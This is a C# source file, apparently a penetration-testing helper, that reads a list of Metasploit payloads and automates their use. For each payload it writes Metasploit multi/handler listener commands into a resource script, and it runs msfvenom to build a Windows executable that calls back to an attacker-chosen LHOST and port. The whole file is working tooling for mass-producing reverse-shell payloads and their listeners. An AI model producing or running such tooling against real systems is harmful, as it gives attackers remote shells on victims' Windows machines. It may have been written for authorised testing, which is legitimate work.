using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Diagnostics;
using System.Collections.Generic;

namespace generatepayloadscripts
{
    class Program
    {
        static string LHOST;
        static int lastPort = 8001;
        static StringBuilder payloadOutput = new StringBuilder();

        static void Main(string[] args)
        {
            if (args.Length < 1){
                Console.WriteLine("GeneratePayloadScripts LHOST");
                return;
            }
            
            LHOST = args[0];

            generateMSFPayloads();
        }
        static void generateMSFPayloads(){
            Console.WriteLine("Callbacks will be made to " + LHOST);

            Console.WriteLine("[!] Generating payload scripts from payloads.txt");

            using (StreamReader reader = new StreamReader("payloads.txt")){
                string line = reader.ReadLine();

                while(line != null && line != ""){
                    processPayload(line);
                    line = reader.ReadLine();
                }
            }

            using (StreamWriter writer = new StreamWriter("all-windows-shells.rc")){
                writer.Write(payloadOutput.ToString());
            }
        }

        static void processPayload(string payloadSet){
            //Jump over commented payloads
            if (payloadSet.StartsWith("#"))return;

            Console.WriteLine("Processing " + payloadSet);

            payloadOutput.Append("use exploit/multi/handler\n");
            payloadOutput.Append(payloadSet + "\n");
            payloadOutput.Append("set LHOST "+ LHOST + "\n");
            payloadOutput.Append("set LPORT "+ lastPort + "\n");
            payloadOutput.Append("exploit -j\n\n");
            generatePayloadBinary(payloadSet);
            lastPort++;
        }

        static void generatePayloadBinary(string payloadSet){
            string venom = " -p " + payloadSet.Replace("set payload ","") + " LHOST=" + LHOST + " LPORT=" + lastPort + " -f exe -o " + payloadSet.Replace("set payload ","").Replace("/","-").Trim()+"-"+lastPort.ToString()+"-"+LHOST+".exe";
            //string venom = " -p " + payloadSet.Replace("set payload ","") + " LHOST=" + LHOST + " LPORT=" + lastPort + " -f raw -o " + payloadSet.Replace("set payload ","").Replace("/","-").Trim()+"-"+lastPort.ToString()+"-"+LHOST+".raw";
            
            Console.WriteLine("MSFVenom Arguments:" + venom);

            ProcessStartInfo psi = new ProcessStartInfo("/usr/bin/msfvenom")
            {
                Arguments = venom,
                WorkingDirectory = Directory.GetCurrentDirectory()
            };

            Process p = Process.Start(psi);
            p.WaitForExit();
        }
    }
}
